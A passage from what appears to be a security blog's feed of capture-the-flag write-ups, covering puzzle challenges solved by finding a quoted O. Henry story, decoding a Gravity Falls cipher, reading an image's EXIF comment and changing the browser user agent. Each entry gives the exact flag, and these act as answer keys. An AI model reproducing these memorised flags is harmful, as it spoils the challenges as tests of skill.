ALLSTREETBROKERSOPENEDHISEYESPEABODYTHECONFIDENTIALCLERKWASSTANDINGBYHISCHAIRHESITATINGTOSPEAKTHEREWASACONFUSEDHUMOFWHEELSBELOWANDTHESEDATIVEBUZZOFANELECTRICFANAHEMPEABODYSAIDDODSONBLINKINGIMUSTHAVEFALLENASLEEPIHADAMOSTREMARKABLEDREAMWHATISITPEABODYMRWILLIAMSSIROFTRACYWILLIAMSISOUTSIDEHEHASCOMETOSETTLEHISDEALINXYZTHEMARKETCAUGHTHIMSHORTSIRIFYOUREMEMBERYESIREMEMBERWHATISXYZQUOTEDATTODAYPEABODYONEEIGHTYFIVESIRTHENTHATSHISPRICEEXCUSEMESAIDPEABODYRATHERNERVOUSLYFORSPEAKINGOFITBUTIVEBEENTALKINGTOWILLIAMSHESANOLDFRIENDOFYOURSMRDODSONANDYOUPRACTICALLYHAVEACORNERINXYZITHOUGHTYOUMIGHTTHATISITHOUGHTYOUMIGHTNOTREMEMBERTHATHESOLDYOUTHESTOCKAT98IFHESETTLESATTHEMARKETPRICEITWILLTAKEEVERYCENTHEHASINTHEWORLDANDHISHOMETOOTODELIVERTHESHARESTHEEXPRESSIONONDODSONSFACECHANGEDINANINSTANTTOONEOFCOLDFEROCITYMINGLEDWITHINEXORABLECUPIDITYTHESOULOFTHEMANSHOWEDITSELFFORAMOMENTLIKEANEVILFACEINTHEWINDOWOFAREPUTABLEHOUSEHEWILLSETTLEATONEEIGHTYFIVESAIDDODSONBOLIVARCANNOTCARRYDOUBLE</div></pre></td></tr></table></figure>
<p><code>BOLIVAR</code> is not the flag. Let’s quickly look over the text, but we don’t want to spend too much time adding, so we fount the <a href="http://www.dominiopublico.gov.br/download/texto/gu001595.pdf" target="_blank" rel="external">original text</a> (Whirligigs, O. Henry, Chapter XIV,<br>THE ROADS WE TAKE, page 82).</p>
<p>Because HTML is better than PDF (<a href="http://www.hymnsandcarolsofchristmas.com/Text/8whrl11h.htm#14" target="_blank" rel="external">http://www.hymnsandcarolsofchristmas.com/Text/8whrl11h.htm#14</a>):</p>
<blockquote>
<p>TWENTY miles West of Tucson, the “Sunset Express” stopped at a tank to take on water. Besides the aqueous, addition the engine of that famous flyer acquired some other things that were not good for it.</p>
<p>While the fireman was lowering the feeding hose, Bob Tidball, “Shark” Dodson and a quarter-bred Creek Indian called John Big Dog climbed on the engine and showed the engineer three round orifices in pieces of ordnance that the carried. These orifices so impressed the engineer with their possibilities that he raised both hands in a gesture such as accompanies the ejaculation “Do tell!”</p>
<p>At the crisp command of Shark Dodson, who was leader of the attacking force the engineer descended to the ground and uncoupled the engine and tender. Then John Big Dog, perched upon the coal, sportively held two guns upon the engine driver and the fireman, and suggested that they run the engine fifty yards away and there await further orders.</p>
<p>Shark Dodson and Bob Tidball, scorning to put such low-grade ore as the passengers through the mill, struck out for the rich pocket of the express car. They found the messenger serene in the belief that the “Sunset Express” was taking on nothing more stimulating and dangerous than aqua pura. While Bob was knocking this idea out of his head with the butt-end of his six-shooter Shark Dodson was already dosing the express-car safe with dynamite.</p>
<p>The safe exploded to the tune of $30,000, all gold and currency. The passengers thrust their heads casually out of the windows to look for the thunder-cloud. The conductor jerked at the bell-rope, which sagged down loose and unresisting, at his tug. Shark Dodson and Bob Tidball, with their booty in a stout canvas bag, tumbled out of the express car and ran awkwardly in their high-heeled boots to the engine.</p>
<p>The engineer, sullenly angry but wise, ran the engine, according to orders, rapidly away from the inert train. But before this was accomplished the express messenger, recovered from Bob Tidball’s persuader to neutrality, jumped out of his car with a Winchester rifle and took a trick in the game. Mr. John Big Dog, sitting on the coal tender, unwittingly made a wrong lead by giving an imitation of a target, and the messenger trumped him. With a ball exactly between his shoulder blades the Creek chevalier of industry rolled off to the ground, thus increasing the share of his comrades in the loot by one-sixth each.</p>
<p>Two miles from the tank the engineer was ordered to stop.</p>
<p>The robbers waved a defiant adieu and plunged down the steep slope into the thick woods that lined the track. Five minutes of crashing through a thicket of chapparal brought them to open woods, where three horses were tied to low-hanging branches. One was waiting for John Big Dog, who would never ride by night or day again. This animal the robbers divested of saddle and bridle and set free. They mounted the other two with the bag across one pommel, and rode fast and with discre- tion through the forest and up a primeval, lonely gorge. Here the animal that bore Bob Tidball slipped on a mossy boulder and broke a foreleg. They shot him through the head at once and sat down to hold a council of flight. Made secure for the present by the tortuous trail they- had travelled, the question of time was no longer so big. Many miles and hours lay between them and the spryest posse that could follow. Shark Dodson’s horse, with trailing rope and dropped bridle, panted and cropped thankfully of the grass along the stream in the gorge. Bob Tidball opened the sack, drew out double handfuls of the neat packages of currency and the one sack of gold and chuckled with the glee of a child.</p>
<p>“Say, you old double-decked pirate,” he called joyfully to Dodson, “you said we could do it – you got a head for financing that knocks the horns off of anything in Arizona.”</p>
<p>“What are we going to do about a hoss for you, Bob? We ain’t got long to wait here. They’ll be on our trail before daylight in the mornin’.”</p>
<p>“Oh, I guess that cayuse of yourn’ll carry double for a while,” answered the sanguine Bob. “We’ll annex the first animal we come across. By jingoes, we made a haul, didn’t we? Accordin’ to the marks on this money there’s $30,000 – $15,000 apiece!”</p>
<p>“It’s short of what I expected,” said Shark Dodson, kicking softly at the packages with the toe of his boot and then he looked pensively at the wet sides of his tired horse.</p>
<p>“Old Bolivar’s mighty nigh played out,” he said, slowly. “I wish that sorrel of yours hadn’t got hurt.”</p>
<p>“So do I,” said Bob, heartily, “but it can’t be helped. Bolivar’s got plenty of bottom – he’ll get us both far enough to get fresh mounts. Dang it, Shark, I can’t belp thinkin’ how funny it is that an Easterner like you can come out here and give us Western fellows cards and spades in the desperado business. What part of the East was you from, anyway?”</p>
<p>“New York State,” said Shark Dodson, sitting down on a boulder and chewing a twig. “I was born on a farm in Ulster County. I ran away from home when I was seventeen. It was an accident my coming West. I was walkin’ along the road with my clothes in a bundle, makin’ for New York City. I had an idea of goin’ there and makin’ lots of money. I always felt like I could do it. I came to a place one evenin’ where the road forked and I didn’t know which fork to take. I studied about it for half an hour, and then I took the left- hand. That night I run into the camp of a Wild West show that was travellin’ among the little towns, and I went West with it. I’ve often wondered if I wouldn’t have turned out different if I’d took the other road.”</p>
<p>“Oh, I reckon you’d have ended up about the same,” said Bob Tidball, cheerfully philosophical. “It ain’t the roads we take; it’s what’s inside of us that makes us turn out the way we do.”</p>
<p>Shark Dodson got up and leaned against a tree.</p>
<p>“I’d a good deal rather that sorrel of yourn hadn’t hurt himself, Bob,” he said again, almost pathetically.</p>
<p>“Same here,” agreed Bob; “he was sure a first-rate kind of a crowbait. But Bolivar, he’ll pull us through all right. Reckon we’d better be movin’ on, hadn’t we, Shark? I’ll bag this boodle ag’in and we’ll hit the trail for higher timber.”</p>
<p>Bob Tidball replaced the spoil in the bag and tied the mouth of it tightly with a cord. When he looked up the most prominent object that he saw was the muzzle of Shark Dodson’s .45 held upon him without a waver.</p>
<p>“Stop your funnin’,” said Bob, with a grin. “We got to be hittin’ the breeze.”</p>
<p>“Set still,” said Shark. “You ain’t goin’ to hit no breeze, Bob. I hate to tell you, but there ain’t any chance for but one of us. Bolivar, he’s plenty tired, and he can’t carry double.”</p>
<p>“We been pards, me and you, Shark Dodson, for three year,” Bob said quietly. “We’ve risked our lives together time and again. I’ve always give you a square deal, and I thought you was a man. I’ve heard some queer stories about you shootin’ one or two men in a peculiar way, but I never believed ‘em. Now if you’re just havin’ a little fun with me, Shark, put your gun up, and we’ll get on Bolivar and vamose. If you mean to shoot – shoot, you blackhearted son of a tarantula!”</p>
<p>Shark Dodson’s face bore a deeply sorrowful look. “You don’t know how bad I feel,” he sighed, “about that sorrel of yourn breakin’ his leg, Bob.”</p>
<p>The expression on Dodson’s face changed in an instant to one of cold ferocity mingled with inexorable cupidity. The soul of the man showed itself for a moment like an evil face in the window of a reputable house.</p>
<p>Truly Bob Tidball was never to “hit the breeze” again. The deadly .45 of the false friend cracked and filled the gorge with a roar that the walls hurled back with indignant echoes. And Bolivar, unconscious accomplice, swiftly bore away the last of the holders-up of the “Sunset Express,” not put to the stress of “carrying double.”</p>
<p>But as “Shark” Dodson galloped away the woods seemed to fade from his view; the revolver in his right hand turned to the curved arm of a mahogany chair; his saddle was strangely upholstered, and he opened his eyes and saw his feet, not in stirrups, but resting quietly on the edge of a quartered-oak desk.</p>
<p>I am telling you that Dodson, of the firm of Dodson &amp; Decker, Wall Street brokers, opened his eyes. Peabody, the confidential clerk, was standing by his chair, hesitating to speak. There was a confused hum of wheels below, and the sedative buzz of an electric fan.</p>
<p>“Ahem! Peabody,” said Dodson, blinking. “I must have fallen asleep. I had a most remarkable dream. What is it, Peabody?”</p>
<p>“Mr. Williams, sir, of Tracy &amp; Williams, is outside. He has come to settle his deal in X. Y. Z. The market caught him short, sir, if you remember.”</p>
<p>“Yes, I remember. What is X. Y. Z. quoted at to-day, Peabody?”</p>
<p>“One eighty-five, sir.”</p>
<p>“Then that’s his price.”</p>
<p>“Excuse me,” said Peabody, rather nervously “for speaking of it, but I’ve been talking to Williams. He’s an old friend of yours, Mr. Dodson, and you practically have a corner in X. Y. Z. I thought you might – that is, I thought you might not remember that he sold you the stock at 98. If he settles at the market price it will take every cent he has in the world and his home too to deliver the shares.”</p>
<p>The expression on Dodson’s face changed in an instant to one of cold ferocity mingled with inexorable cupidity. The soul of the man showed itself for a moment like an evil face in the window of a reputable house.</p>
<p>“He will settle at one eighty-five,” said Dodson. “Bolivar cannot carry double.”</p>
</blockquote>
<p>Description said the end was very important so we tried <code>BOLIVARCANNOTCARRYDOUBLE</code> as flag. And that was the one.</p>
<p><strong>Feedback</strong>: no flag format, flag are meaningless so it may be hard to know when you get the flag or not, they need to use a flag format or give in the description what the flag have to look like, here we just known that was at the end</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="crypto" scheme="http://rawsec.ml/tags/crypto/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 200 - Here goes ! - Recon</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-recon-Here-goes/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-recon-Here-goes/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T22:20:04.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chill3d</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>categories: trivial, crypto, recon</p>
<blockquote>
<p><img src="https://i.imgur.com/mXTu7tU.png" alt="https://i.imgur.com/mXTu7tU.png"></p>
</blockquote>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>This challenge was the first crypto challenge of the Junior CTF 2016.<br>First, it’s pretty easy to know that the flag is encoded in shapes in the bottom left of this picture. But the question is, how to translate/decode it ?   </p>
<p>Go on Google Image and proceed at a picture search…</p>
<p>We find this link : <a href="http://gravityfalls.wikia.com/wiki/Nightmare_Head/Gallery" target="_blank" rel="external">http://gravityfalls.wikia.com/wiki/Nightmare_Head/Gallery</a>   </p>
<p>So, this capture come from <code>Gravity Falls</code>… Let’s navigate on the wiki…</p>
<p>A page is talking about a list of cryptogram, interesting :smirk: (<a href="http://gravityfalls.wikia.com/wiki/List_of_cryptograms" target="_blank" rel="external">http://gravityfalls.wikia.com/wiki/List_of_cryptograms</a>)    </p>
<p>Oh ! In Bill’s symbol substitution cipher we find shapes that are on the picture ! (<a href="http://gravityfalls.wikia.com/wiki/List_of_cryptograms#Bill.27s_symbol_substitution_cipher" target="_blank" rel="external">http://gravityfalls.wikia.com/wiki/List_of_cryptograms#Bill.27s_symbol_substitution_cipher</a>).</p>
<p>If we replace shapes by letters we find the following text : <code>FIXPROBLEMQUICKLYWITHGALVANIZEDJETS</code>.</p>
<p>Flag : <code>FIXPROBLEMQUICKLYWITHGALVANIZEDJETS</code> :tada:</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="reconnaissance" scheme="http://rawsec.ml/tags/reconnaissance/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 100 - Black Suprematic Square - Web</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-web-Black-Suprematic-Square/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-web-Black-Suprematic-Square/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T21:54:59.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>categories: trivial, web</p>
<blockquote>
<p><img src="http://i.imgur.com/8QgIphK.jpg" alt=""></p>
<p> M.Iu.Lupanov</p>
</blockquote>
<p>source:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[...]</div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"task_header"</span>&gt;</span>Black Suprematic Square<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"task_body"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">center</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width: 478px;"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> = <span class="string">"http://juniors.ucoz.net/Black_Suprematic_Square.jpg"</span> &gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> = <span class="string">"http://juniors.ucoz.net/Black_And_White_Symbols.jpg"</span> <span class="attr">width</span>=<span class="string">0</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">[...]</div></pre></td></tr></table></figure>
<p>This image was hidden: <img src="http://juniors.ucoz.net/Black_And_White_Symbols.jpg" alt=""></p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––[~/CTF/JuniorCTF/2016]</div><div class="line">$ exiftool Black-Suprematic-Square/Black_And_White_Symbols.jpg</div><div class="line">ExifTool Version Number         : 10.20</div><div class="line">File Name                       : Black_And_White_Symbols.jpg</div><div class="line">Directory                       : Black-Suprematic-Square</div><div class="line">File Size                       : 76 kB</div><div class="line">File Modification Date/Time     : 2016:11:22 02:19:51+01:00</div><div class="line">File Access Date/Time           : 2016:11:25 16:15:54+01:00</div><div class="line">File Inode Change Date/Time     : 2016:11:25 16:15:54+01:00</div><div class="line">File Permissions                : rw-r--r--</div><div class="line">File Type                       : JPEG</div><div class="line">File Type Extension             : jpg</div><div class="line">MIME Type                       : image/jpeg</div><div class="line">JFIF Version                    : 1.01</div><div class="line">Resolution Unit                 : inches</div><div class="line">X Resolution                    : 72</div><div class="line">Y Resolution                    : 72</div><div class="line">Comment                         : aima0AiwahsidupaiToehoong1PhieruqueivahphieKah7uceetair9aiGae1eSsaedoo4becooShohhu8eifahXi7EJoh2gaephechei5chiP9</div><div class="line">Image Width                     : 477</div><div class="line">Image Height                    : 406</div><div class="line">Encoding Process                : Progressive DCT, Huffman coding</div><div class="line">Bits Per Sample                 : 8</div><div class="line">Color Components                : 3</div><div class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</div><div class="line">Image Size                      : 477x406</div><div class="line">Megapixels                      : 0.194</div></pre></td></tr></table></figure>
<p><code>aima0AiwahsidupaiToehoong1PhieruqueivahphieKah7uceetair9aiGae1eSsaedoo4becooShohhu8eifahXi7EJoh2gaephechei5chiP9</code> was the flag.</p>
<p><strong>Feedback</strong>: no flag format, flag are meaningless so it may be hard to know when you get the flag or not, they need to use a flag format or give in the description what the flag have to look like.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 300 - Six Strange Tales - Web</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-web-Six-Strange-Tales/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-web-Six-Strange-Tales/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T21:54:59.195Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>categories: web</p>
<blockquote>
<p><img src="http://i.imgur.com/nuiH6tv.jpg" alt=""></p>
<ul>
<li>Gruncle Stan, what’s the secret of the six fingered hand?</li>
<li>Can you see these codes? When the six fingered hand touches them, one of the Gravity Falls secrets opens!</li>
<li>Gruncle, but how should we read the secret? From left to right or right to left? Or maybe upside down?</li>
<li>It depends on whether you are a Christian, a Muslim or a Taoist…</li>
</ul>
<p><img src="http://i.imgur.com/GIYH3fA.png" alt=""></p>
<p>Lupanov M.Iu.</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Let’s see source code of the web page:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">[...]</div><div class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">"img"</span> <span class="attr">width</span>=<span class="string">"717"</span> <span class="attr">height</span>=<span class="string">"380"</span>&gt;</span></div><div class="line">flag=&#123;fH7eAHJT3tXWD1e7afAvVfhcb&#125;      </div><div class="line"><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"> &lt;!--</span></div><div class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'load'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line"><span class="keyword">var</span> b = <span class="built_in">document</span>.getElementById(<span class="string">'img'</span>);</div><div class="line"><span class="keyword">var</span> a = b.getContext(<span class="string">'2d'</span>);</div><div class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> Image();</div><div class="line">d.src = <span class="string">"http://i.imgur.com/GIYH3fA.png"</span>;</div><div class="line">d.addEventListener(<span class="string">'load'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">a.drawImage(<span class="keyword">this</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">k = <span class="number">174</span>;</div><div class="line">l = <span class="number">345</span>;</div><div class="line">m = <span class="number">12</span>;</div><div class="line">n = <span class="number">89</span>;</div><div class="line">o = <span class="number">671</span>;</div><div class="line">p = <span class="number">18</span>;</div><div class="line">q = <span class="number">222</span>;</div><div class="line">r = q<span class="number">-1</span>;</div><div class="line">c=<span class="string">"rgba(0,0,0,0)"</span>;</div><div class="line"><span class="keyword">if</span> (navigator.userAgent == <span class="string">"Gravity Falls"</span>)</div><div class="line">c=c.replace(<span class="regexp">/(0)(\))/</span>,<span class="string">"$1.5$2"</span>);</div><div class="line">a.fillStyle = c;         </div><div class="line">a.fillRect(q%m<span class="number">-6</span>, k<span class="number">-3</span>, n+r-q<span class="number">-2</span>, <span class="number">5</span>-(p-q));</div><div class="line">a.fillRect(<span class="number">2</span>*(q+<span class="number">1</span>), p+<span class="number">1</span>, n+r-q+<span class="number">2</span>, l+<span class="number">16</span>);</div><div class="line">a.fillRect(l+r<span class="number">-30</span>, o%p<span class="number">-5</span>, <span class="number">2</span>*l<span class="number">-600</span>, q+<span class="number">5</span>-p);</div><div class="line">a.fillRect(q%n+<span class="number">42</span>, o%p<span class="number">-5</span>, o<span class="number">-600</span>+p+<span class="number">1</span>, <span class="number">2</span>*(p+<span class="number">1</span>));</div><div class="line">a.fillRect(<span class="number">176</span>, o%p<span class="number">-5</span>, <span class="number">2</span>*l<span class="number">-600</span>, q/<span class="number">2</span>*<span class="number">3</span>+<span class="number">47</span>);</div><div class="line">a.fillRect(<span class="number">2</span>*k+p<span class="number">-100</span>, q%m<span class="number">-6</span>, o<span class="number">-600</span>+p+<span class="number">1</span>, n+r-m/<span class="number">2</span>);</div><div class="line">a.fillRect(o%p<span class="number">-5</span>, q%m<span class="number">-6</span>, <span class="number">2</span>*l<span class="number">-604</span>, k-p<span class="number">-4</span>);</div><div class="line">a.fillRect(<span class="number">2</span>*k+p<span class="number">-100</span>, q/<span class="number">2</span>*<span class="number">3</span><span class="number">-10</span>, <span class="number">3</span>*m+p*<span class="number">3</span>, (p+<span class="number">1</span>)*<span class="number">3</span>);</div><div class="line">a.fillRect(<span class="number">2</span>*k+p-m+<span class="number">2</span>, q%m<span class="number">-6</span>,<span class="number">2</span>*l<span class="number">-600</span>, q+n+m<span class="number">-190</span>);</div><div class="line">a.fillRect(<span class="number">2</span>*k+p<span class="number">-10</span>, k-p-m/<span class="number">3</span>, o<span class="number">-600</span>+p+<span class="number">1</span>, r+m*<span class="number">2</span>/<span class="number">3</span>+p);</div><div class="line">a.fillRect(n<span class="number">-3</span>, q-k+<span class="number">9</span>, <span class="number">2</span>*(l<span class="number">-300</span>), q+n+m);</div><div class="line">a.fillRect(l+q<span class="number">-31</span>, q+m/<span class="number">2</span>,<span class="number">2</span>*l<span class="number">-600</span>, k-p-m/<span class="number">3</span>);</div><div class="line">a.fillRect(o<span class="number">-2</span>*p-p/<span class="number">2</span>, q%m<span class="number">-6</span>, <span class="number">2</span>*l<span class="number">-600</span>, q/<span class="number">2</span>*<span class="number">3</span>+<span class="number">47</span>);</div><div class="line">&#125;,<span class="literal">false</span>);&#125;,<span class="literal">false</span>);</div><div class="line"><span class="comment">// --&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p><code>flag={fH7eAHJT3tXWD1e7afAvVfhcb}</code> is not the good flag, it needs transformations.</p>
<p>We can see that we need a different user agent: <code>Gravity Falls</code>.</p>
<p>We changed our user agent to <code>Gravity Falls</code> and reloaded the page, the image has changed:</p>
<p><img src="http://i.imgur.com/PT2D2mi.png" alt=""></p>
<p>Let’s mix them: <code>AhWae2Oh</code>, <code>Is4feeh3</code>, <code>ud2juD9a</code>, <code>aej8eeTh</code>, <code>Maiy2au0</code>, <code>dawu0Aeb</code>.</p>
<ul>
<li>left to right: <code>AhWae2OhIs4feeh3ud2juD9aaej8eeThMaiy2au0dawu0Aeb</code></li>
<li>right to left: <code>dawu0AebMaiy2au0aej8eeThud2juD9aIs4feeh3AhWae2Oh</code></li>
<li>upside down: <code>Maiy2au0Is4feeh3aej8eeThAhWae2Ohdawu0Aebud2juD9a</code></li>
</ul>
<p><a href="http://gravityfalls.wikia.com/wiki/Scary-oke" target="_blank" rel="external">http://gravityfalls.wikia.com/wiki/Scary-oke</a> is no help.</p>
<p><code>AhWae2OhIs4feeh3ud2juD9aaej8eeThMaiy2au0dawu0Aeb</code> was the flag.</p>
<p><strong>Feedback</strong>: This is more a joy than a web and this isn’t really about security. I’m tired to see challenge like that. No flag format, flag are meaningless so it may be hard to know when you get the flag or not, they need to use a flag format or give in the description what the flag have to look like.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>RC3 CTF - 100 - My Lil Droid - Forensics</title>
    <link href="http://rawsec.ml/en/RC3CTF-2016-forensics-100-My-Lil-Droid/"/>
    <id>http://rawsec.ml/en/RC3CTF-2016-forensics-100-My-Lil-Droid/</id>
